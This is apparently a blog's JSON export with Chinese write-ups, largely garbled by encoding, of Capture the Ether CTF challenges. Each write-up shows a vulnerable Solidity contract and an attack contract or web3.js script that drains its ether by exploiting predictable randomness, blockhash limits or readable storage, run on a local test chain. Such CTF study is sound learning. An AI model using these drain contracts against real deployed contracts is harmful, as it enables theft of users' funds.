&quot;60806040526040516106e63803806106e68339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b610432806102b46000396000f3fe60806040526004361061001e5760003560e01c8063283fdc7814610023575b600080fd5b61002b610041565b60405161003891906102cc565b60405180910390f35b606060008060005b600160008054905061005b919061031d565b8110156101ab576001925060005b60018260008054905061007c919061031d565b610086919061031d565b81101561019257600060018261009c9190610351565b815481106100ad576100ac610385565b5b9060005260206000200154600082815481106100cc576100cb610385565b5b9060005260206000200154111561017f57600081815481106100f1576100f0610385565b5b90600052602060002001549250600060018261010d9190610351565b8154811061011e5761011d610385565b5b90600052602060002001546000828154811061013d5761013c610385565b5b906000526020600020018190555082600060018361015b9190610351565b8154811061016c5761016b610385565b5b9060005260206000200181905550600093505b808061018a906103b4565b915050610069565b50826101ab5780806101a3906103b4565b915050610049565b5060008054806020026020016040519081016040528092919081815260200182805480156101f857602002820191906000526020600020905b8154815260200190600101908083116101e4575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b61024381610230565b82525050565b6000610255838361023a565b60208301905092915050565b6000602082019050919050565b600061027982610204565b610283818561020f565b935061028e83610220565b8060005b838110156102bf5781516102a68882610249565b97506102b183610261565b925050600181019050610292565b5085935050505092915050565b600060208201905081810360008301526102e6818461026e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061032882610230565b915061033383610230565b925082820390508181111561034b5761034a6102ee565b5b92915050565b600061035c82610230565b915061036783610230565b925082820190508082111561037f5761037e6102ee565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103bf82610230565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103f1576103f06102ee565b5b60018201905091905056fea2646970667358221220ae8c4b8dcba12a3c05b294a45463cdbfcc21cbcdcfe3c2160fd3b8e26fa8304a64736f6c63430008130033&quot;;// éƒ¨ç½²åˆçº¦çš„ä»£ç // contract.deploy(&#123;// data: byteCode,// arguments: [[5,4,3,2,1]]// &#125;).send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// gas: 4700000,// value: 1// &#125;,function(err,result)&#123;// console.log(&quot;åˆçº¦éƒ¨ç½²å¾—åˆ°çš„äº¤æ˜“å“ˆå¸Œä¸ºï¼š&quot;);// console.log(result);// &#125;)// è°ƒç”¨åˆçº¦å‡½æ•°var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;)// var answer;// web.eth.getStorageAt(address,0,(err,result)=&gt;&#123;// answer = web.utils.hexToNumber(result);// console.log(answer);// &#125;) tips:å¦‚æœå‡½æ•°éœ€è¦ä¼ å‚ï¼Œç›´æ¥åœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™ä¼ å…¥å°±å¯ä»¥äº†ï¼Œå¦‚ä¸‹ï¼š","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"å­¦ä¹ æ€»ç»“","slug":"å­¦ä¹ æ€»ç»“","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"}]},{"title":"Predict the block hash","slug":"CTFS/capther the ether/Predict the block hash","date":"2023-04-10T06:01:10.000Z","updated":"2023-04-10T06:01:10.000Z","comments":true,"path":"2023/04/10/CTFS/capther the ether/Predict the block hash/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/CTFS/capther%20the%20ether/Predict%20the%20block%20hash/","excerpt":"","text":"Predict the block hash1. é¢˜ç›® 1.1 é¢˜ç›®ï¼š Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123; address guesser; bytes32 guess; uint256 settlementBlockNumber; function PredictTheBlockHashChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(bytes32 hash) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = hash; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); bytes32 answer = block.blockhash(settlementBlockNumber); guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œè¯¥é¢˜å’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œè¿™é¢˜è¦çŒœæµ‹çš„æ•°æ˜¯ 256ä½çš„ï¼Œå³byte32ç±»å‹ 2.2 è¿™é¢˜æ˜¯éœ€è¦é¢„æµ‹ä¸‹ä¸€ä¸ªå—å“ˆå¸Œçš„å—å·ï¼Œæ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯ å®˜æ–¹æ–‡æ¡£å¯¹ block.blockhash æ˜¯è¿™æ ·å®šä¹‰å’Œè§£é‡Šçš„ ![image-20240412145027802](Predict the block hash&#x2F;image-20240412145027802.png) å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œæˆ‘å»ç½‘ä¸Šæœçš„è§£é‡Šæ˜¯ï¼Œä»–åªèƒ½å¾—åˆ°256ä¸ªåŒºå—å†…çš„å“ˆå¸Œå€¼ï¼Œä¸€æ—¦è¶…è¿‡256çš„åŒºå—ï¼Œå°±æ— æ³•è¿”å›å¯¹åº”çš„åŒºå—å“ˆå¸Œï¼Œåªä¼šè¿”å›é›¶â€”-æˆ‘çš„ç†è§£æ˜¯ï¼šå¦‚æœé¢˜ç›®ä¸­çš„ answer æ˜¯åœ¨ block.number &#x3D; 0 æ—¶è®¾ç½®çš„ï¼Œå½“æ­¤æ—¶çš„block.number &gt;&#x3D; 256æ—¶ï¼Œå†å»è®¡ç®— block.blockhash(settlementBlockNumber) è¿™ä¸ªå€¼å°±æ˜¯ block.blockhash(0) çš„å€¼äº†ï¼ˆsettlementBlockNumber &#x3D; block.number + 1ï¼‰ 2.3 è§£é¢˜æ€è·¯å°±æ˜¯ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ lockInGuess() å‡½æ•°ï¼Œä»¥ 0 çš„hash ä½œä¸ºå‚æ•°ä¼ å…¥è¯¥å‡½æ•°ä¸­ï¼Œè¿‡ä¸€æ®µæ—¶é—´åï¼Œå†è°ƒç”¨ settle() å‡½æ•°ï¼Œå…·ä½“ç­‰å¤šä¹…æˆ‘ä¹Ÿä¸çŸ¥é“ 3. è§£é¢˜12345678910111213141516171819contract Hack &#123; PredictTheBlockHashChallenge challenge; function Hack(address _challenge) public &#123; challenge = PredictTheBlockHashChallenge(_challenge); &#125; function lockInGuess() public payable &#123; challenge.lockInGuess.value(1 ether)(keccak256(0)); &#125; /* ç­‰è¿‡äº†256ä¸ªåŒºå—ä¹‹åï¼Œå†è°ƒç”¨æ­¤å‡½æ•°*/ function attack() public &#123; challenge.settle(); require(challenge.isComplete(), &quot;not pass&quot;); tx.origin.transfer(address(this).balance); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Predict the future","slug":"CTFS/capther the ether/Predict the future","date":"2023-04-10T04:01:10.000Z","updated":"2023-04-10T04:01:10.000Z","comments":true,"path":"2023/04/10/CTFS/capther the ether/Predict the future/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/CTFS/capther%20the%20ether/Predict%20the%20future/","excerpt":"","text":"Predict the future1. é¢˜ç›® 1.1 This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers. Note that it is indeed possible to solve this challenge without losing any ether. 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123; address guesser; uint8 guess; uint256 settlementBlockNumber; function PredictTheFutureChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜éœ€è¦æå‰é”å®šç­”æ¡ˆï¼Œå†éªŒè¯ç­”æ¡ˆï¼ˆå³ï¼Œå…ˆè°ƒç”¨ lockInGuess å‡½æ•°å†è°ƒç”¨ settle å‡½æ•°ï¼‰ï¼›å¾ˆæ˜¾ç„¶è¿™æ ·æ˜¯çŒœä¸å‡ºæ¥çš„ï¼Œä½†æ˜¯ç”± uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; å¯çŸ¥ï¼Œanswer çš„å€¼åªç”¨åä¸ªå¯èƒ½ï¼Œå³ [0,9] 2.2 æˆ‘ä»¬å¯ä»¥å…ˆç¡®å®šæˆ‘ä»¬è‡ªå·±è®¾å®šçš„ answer ï¼Œæ”¹å˜é¢˜ç›®è¦æ±‚ä¸­çš„ answer ï¼Œé€šè¿‡ä¸æ–­æ”¹å˜ block.number å’Œ æ—¶é—´æˆ³æ¥æ”¹å˜é¢˜ç›®ä¸­çš„ answer ï¼ˆè°ƒç”¨å…¶ä»–åˆçº¦æ—¶ï¼Œæ˜¯åœ¨åŒä¸€å—åŒºå—ä¸­è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯ä¸ºæˆ‘ä»¬ç¡®å®šå”¯ä¸€çš„ block.number å’Œ æ—¶é—´æˆ³ï¼‰ 2.3 ç¼–å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œ 123456789101112131415161718192021222324contract attack&#123; PredictTheFutureChallenge pre; uint8 public answer=5; function attack(address _addr)public&#123; pre = PredictTheFutureChallenge(_addr); &#125; function lock()public payable&#123; pre.lockInGuess.value(1 ether)(answer); &#125; function att()public&#123; uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; if(temp == answer)&#123; pre.settle(); &#125; require(pre.isComplete())&#123; tx.orgin.transfer(address(this).balance); &#125; &#125; function()external payable&#123; &#125;&#125; 2.4 å…ˆé”å®šæˆ‘ä»¬çš„ç­”æ¡ˆï¼ˆè°ƒç”¨lock() å‡½æ•°ï¼‰ï¼Œä¸åœçš„è°ƒç”¨att() å‡½æ•°ï¼Œç›´åˆ° PredictTheFutureChallenge åˆçº¦ä¸­çš„ isComplete å‡½æ•°çš„å€¼è¿”å›çš„æ˜¯ true æˆ– åˆçº¦çš„ä½™é¢ä¸º 0 3. è§£é¢˜ 3.1 ä½¿ç”¨ Web3è§£é¢˜ï¼ˆå› ä¸ºremixçš„bugå®åœ¨æ˜¯å¤ªå¤šäº†ï¼‰ï¼Œå…ˆåœ¨ remixéƒ¨ç½²åˆçº¦ï¼Œè·å–ç›¸å¯¹åº”çš„åˆçº¦åœ°å€ tipsï¼šéƒ¨ç½²ä¸€ä¸ª attack åˆçº¦ä¹‹åï¼Œå¦‚æœæ‰§è¡Œäº†lock å‡½æ•°å°±ä¸èƒ½åœ¨ä¸é‡æ–°éƒ¨ç½² PredictTheFutureChallengeåˆçº¦çš„åŸºç¡€ä¸Šä½¿ç”¨æ–°åˆçº¦è°ƒç”¨lockå‡½æ•°ï¼Œå› ä¸ºguesserå·²ç»è¢«èµ‹å€¼äº†ï¼Œç¨åçš„require å°†ä¸èƒ½é€šè¿‡ 3.2 åœ¨æˆ‘çš„ vscodeä¸Šé¢ç–¯ç‹‚æ‰§è¡Œ att å‡½æ•°ï¼Œç›´åˆ°remixä¸Š isCompleteè¿”å›çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œåˆçº¦çš„é‡‘é¢è½¬ç§»ä¸ºæ­¢ï¼Œå¦‚å›¾ï¼š![image-20240412145108409](Predict the future&#x2F;image-20240412145108409.png) 3.3 åœ¨ vscode ä¸Šçš„ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var contractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\é¶åœº\\\\capturetheether\\\\abi\\\\PredictTheFutureChallengeHack.abi&quot;),toString());// var contractADD = &quot;0x80F5D36E412076Dd758961d729D8F84dc6c34A46&quot;;var contractADD = &quot;0xD52d9e548C6d18445a465dd08b5b2B47ca449Ee9&quot;; // Hack_Addressvar contract = new web.eth.Contract(contractABI,contractADD);// console.log(contract);var balance = web.eth.getBalance(contractADD,function(err,result)&#123;console.log(result);&#125;);// console.log(balance);// 00000000000000000000000580f5d36e412076dd758961d729d8f84dc6c34a46var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; // answer = web.utils.hexToNumber(result); console.log(&quot;è¿™ä¸ªæ˜¯ç»“æœï¼š&quot; + result);&#125;)// contract.methods.lock().send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// value: 1000000000000000000// &#125;).on(&quot;receipt&quot;,function(result)&#123;// console.log(result);// &#125;)contract.methods.att().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, // value: 1000000000000000000&#125;).on(&quot;receipt&quot;,function(result)&#123; console.log(result);&#125;)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the new number","slug":"CTFS/capther the ether/Guess the new number","date":"2023-04-07T01:47:10.000Z","updated":"2023-04-07T01:47:10.000Z","comments":true,"path":"2023/04/07/CTFS/capther the ether/Guess the new number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/07/CTFS/capther%20the%20ether/Guess%20the%20new%20number/","excerpt":"","text":"Guess the new number1. é¢˜ç›® 1.1 è¦æ±‚ï¼š The number is now generated on-demand when a guess is made 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123; function GuessTheNewNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œansweræ˜¯åœ¨æ‰§è¡Œ guess å‡½æ•°çš„ä¹‹åæ‰ä¼šè¢«èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç›´æ¥é€šè¿‡ web3 å’Œåˆçº¦äº¤äº’è·å– answer ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åŒä¸€å—åŒºå—ä¸­çš„æ—¶é—´æˆ³æ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´è®© guess å‡½æ•°å’Œè‡ªå·±çš„ç­”æ¡ˆåœ¨åŒä¸€ä¸ªåˆçº¦ä¸­ 2.1 ä»€ä¹ˆæ„æ€å‘¢ï¼Œç®€å•æ¥è¯´å°±æ˜¯ answer çš„å®šä¹‰ä¸ºï¼š uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now))); (å…¶ä¸­ now å°±æ˜¯æ—§ç‰ˆæœ¬çš„æ—¶é—´æˆ³ï¼Œç°åœ¨è·å–æ—¶é—´æˆ³çš„æ–¹æ³•æ˜¯ï¼šblock.timestamp ) 3. è§£é¢˜æ”»å‡»åˆçº¦ 12345678910111213141516contract Hack &#123; GuessTheNewNumberChallenge challenge; function Hack(address _challenge) public &#123; challenge = GuessTheNewNumberChallenge(_challenge); &#125; function attack() public payable &#123; uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); challenge.guess.value(1 ether)(answer); &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the random number","slug":"CTFS/capther the ether/Guess the random number","date":"2023-04-05T04:59:10.000Z","updated":"2023-04-05T04:59:10.000Z","comments":true,"path":"2023/04/05/CTFS/capther the ether/Guess the random number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/05/CTFS/capther%20the%20ether/Guess%20the%20random%20number/","excerpt":"","text":"Guess the random number1. é¢˜ç›® 1.1 This time the number is generated based on a couple fairly random sources 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123; uint8 answer; function GuessTheRandomNumberChallenge() public payable &#123; require(msg.value == 1 ether); answer = uint8(keccak256(block.blockhash(block.number - 1), now)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 é¢˜ç›®ä»£ç ä¸­çš„ answer æ˜¯éšæœºç”Ÿæˆçš„ï¼ŒåŠæ ¹æ®åˆ›å»ºçš„æ—¶å€™åŒºå—å·å’Œå½“æ—¶çš„æ—¶é—´ now æ¥æ‰“çš„æ—¶é—´æˆ³ã€‚ 2.2 åŒºå—é“¾é“¾ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸åˆçº¦äº¤äº’ï¼Œè·å–åˆ°åˆçº¦ä¸Šå­˜å‚¨çš„å€¼ 2.3 åˆå› ä¸ºåˆçº¦ä¸­åªæœ‰ä¸€ä¸ªå˜é‡ï¼ŒåŠç´¢å¼•ä¸º 0 ä½ç½®çš„å€¼ï¼Œä¾¿æ˜¯æˆ‘çš„ç­”æ¡ˆanswer 1var contract = new web.eth.Contract(contract_abi,contract_add); tips: ä¸ºäº†å¼„æ‡‚è¿™ä¸ªå­˜å‚¨ä½ç½®ï¼Œæˆ‘è¿˜ç‰¹æ„å»é˜…è¯»ç›¸å…³æ–‡çŒ®äº†è§£äº†EVMçš„å­˜å‚¨ä½ç½®å’ŒåŸç†ï¼Œç›¸å…³æ–‡ç« åœ¨è¿™ ï¼š storage-slotå­˜å‚¨æ‹“å±• 3. è§£é¢˜ 3.1 ç”¨ jsä»£ç  å®ç° web3 ä¸åˆçº¦çš„äº¤äº’ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// console.log(web.currentProvider);// remix ä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€var contract_add = &quot;0x4DB61fCf9a56da7575e38f68BAf8E1621513001a&quot;;// åœ¨remix ä¸Šè·å–çš„ ABIvar contract_abi = [ &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;n&quot;, &quot;type&quot;: &quot;uint8&quot; &#125; ], &quot;name&quot;: &quot;guess&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;isComplete&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bool&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// åˆ›å»ºåˆçº¦å®ä¾‹var contract = new web.eth.Contract(contract_abi,contract_add);// console.log(contract);web.eth.getStorageAt(contract_add,0,(error,result) =&gt; &#123; // å°†ç»“æœçš„ 16 è¿›åˆ¶æ•°è½¬åŒ–ä¸º 10è¿›åˆ¶ var answer = web.utils.hexToNumber(result); //è¾“å‡ºç»“æœ console.log(&quot;å­˜å‚¨ä¸ºï¼š&quot;,answer)&#125;) 3.2 åœ¨æ§åˆ¶å°è·å– åˆçº¦ çš„ answer ![image-20240412144836149](Guess the random number&#x2F;image-20240412144836149.png) 3.3 åœ¨ remix ä¸­éªŒè¯ ![image-20240412144855415](Guess the random number&#x2F;image-20240412144855415.png) 3.4 ç»“æœæ­£ç¡®","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3_self","slug":"Utils/Web3/web3_self","date":"2023-04-01T02:47:10.000Z","updated":"2023-04-01T02:47:10.000Z","comments":true,"path":"2023/04/01/Utils/Web3/web3_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/01/Utils/Web3/web3_self/","excerpt":"","text":"web3_day01å­¦ä¹ èµ„æºè§†é¢‘å®˜æ–¹æ–‡æ¡£å¥½æ–‡æ¡£1. Web3.js çš„å®‰è£…1.1 node.js çš„ä¸‹è½½å®‰è£…åŠé…ç½®ï¼š å‚è€ƒåšå®¢1.2 åœ¨ VSCode ä¸­å®‰è£…æ’ä»¶ ï¼š code runner 2. ä¸‹è½½å®‰è£…ä½¿ç”¨Ganacheç½‘ä¸Šæœä¸€ä¸‹å°±æœ‰äº†ï¼Œå»ºè®®è‡ªå·±åˆ›å»ºä¸€ä¸ªå·¥ä½œçš„ç©ºé—´ï¼Œè¿™æ ·ä¹‹å‰æ“ä½œ çš„äº¤æ˜“ä¿¡æ¯å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ã€‚ 3. è·Ÿç€è§†é¢‘æ•²ä»£ç 3.1 è§†é¢‘ä¸­çš„ä»£ç ï¼š123let Web3 = require(&#x27;web3&#x27;);web3 = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web3); åˆ†æï¼š è§£è¯»ï¼šç¬¬ä¸€è¡Œä¸­çš„ require(&#39;web3&#39;) web3æ˜¯åº“ä¸­çš„åå­—ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è‡ªå®šä¹‰çš„ï¼Œå°è¯•æ”¹æˆå…¶ä»–åå­—æŠ¥é”™å¦‚ä¸‹ï¼š å˜é‡å web3 å®¹æ˜“å’Œç¬¬ä¸€è¡Œä¸­çš„ â€˜web3â€™ ææ··ï¼Œæ‰€ä»¥è‡ªå·±æ¢äº†ä¸€ä¸ªå˜é‡å è‡ªå·±çš„ä»£ç ï¼š 123let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web); 4. å­æ¨¡å—åˆ—è¡¨ åœ¨æ‰§è¡Œè¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå‡ºç°äº†é”™è¯¯ ä»£ç ï¼š 1234let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));web.eth.getNodeInfo().then(console.log); è§£è¯»ï¼š å®˜æ–¹æ–‡æ¡£ä¸Šçš„åŸå‡½æ•°æ˜¯è¿™æ ·è¿™æ ·å†™çš„: web3.eth.getNodeInfo([callback]); è€å¸ˆçš„å†™æ³•æ˜¯ï¼š web.eth.getNodeInfo().then(); è€å¸ˆè¯´æ˜¯ä¸€æ ·çš„ï¼Œ.then çš„æ„æ€æ˜¯ï¼šæ‰§è¡Œå®Œweb.eth.getNodeInfo() ä¹‹åï¼Œå†å»æ‰§è¡Œ .then() æ‹¬å·é‡Œçš„ä»£ç ï¼Œå³ console.log ã€‚ é”™è¯¯ï¼š è§£å†³æ–¹æ¡ˆï¼š æ‰“å¼€èœå•é€‰é¡¹ï¼Œæ‰¾åˆ°ä¹‹å‰å®‰è£…çš„ Ganacheï¼Œå¯åŠ¨å®ƒå³å¯ï¼Œç„¶åå†æ¬¡è¿è¡Œä»£ç  æ€»ç»“ï¼šå¦‚æœæŠŠ Ganache å…³é—­äº†ï¼Œä»£ç åˆæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œåªæœ‰å°† Gannache ä¸€ç›´å¼€ç€çš„ï¼Œæ‰å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ ä¸çŸ¥é‚£ä¸€å¤§ä¸²æ˜¯ä»€ä¹ˆ 5. ç½‘ç»œçŠ¶æ€æŸ¥è¯¢5.1 æŸ¥çœ‹æ˜¯å¦è¿æ¥åˆ°èŠ‚ç‚¹ ï¼š web.eth.net.isListening().then(console.log); web.bzz.net.isListening().then(console.log); 5.2 è·å– Network ID (ç½‘ç»œå·) 6. providersç›¸å…³6.1 æŸ¥çœ‹ Web3 ä¸­æ‰€æœ‰å¯ç”¨çš„Providers ä»£ç ï¼š 123456789&gt;let Web3 = require(&#x27;web3&#x27;);&gt;web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));&gt;// web.eth.getNodeInfo().then(console.log);&gt;// web.eth.net.isListening().then(console.log);&gt;// web.bzz.net.isListening().then(console.log);&gt;console.log(web.providers); è¿è¡Œç»“æœï¼š 6.2 æŸ¥çœ‹å½“å‰è®¾ç½®çš„ Web3 provider 6.3 æŸ¥çœ‹æµè§ˆå™¨ç¯å¢ƒè®¾ç½®çš„web3 provider 6.4 è®¾ç½®&#x2F; ä¿®æ”¹ provider 7. æ‰¹å¤„ç†è¯·æ±‚7.1 å°†å‘å¸ƒåˆçº¦åˆ°æµ‹è¯•ç½‘ é‡å¤´æˆï¼ï¼ï¼çœ‹åˆ°è¿™ä¸ªç•Œé¢ï¼Œæˆ‘å°±çŸ¥é“ï¼Œæˆ‘åˆå¯ä»¥å­¦åˆ°ä¸œè¥¿äº† åŸæ¥æ˜¯æ˜¯è¿™æ ·è¿æ¥æœ¬åœ°çš„è´¦æˆ·ï¼Œç›´æ¥æƒŠå‘†ï¼ æ–¹æ³•ä¸€ï¼š â‘  æ‰“å¼€remixï¼Œé€‰æ‹©è¿™ä¸¤ä¸ªå…¶ä¸­ä¹‹ä¸€ï¼š â‘¡ å°†è‡ªå·±æœ¬åœ°çš„ç«¯å£å·å¡«å…¥ï¼š â‘¢ ç„¶åå°±å‘ˆç°å¦‚ä¸‹ç•Œé¢ï¼š â‘£ æœ¬åœ°è´¦æˆ·å’Œremix ä¸­çš„ 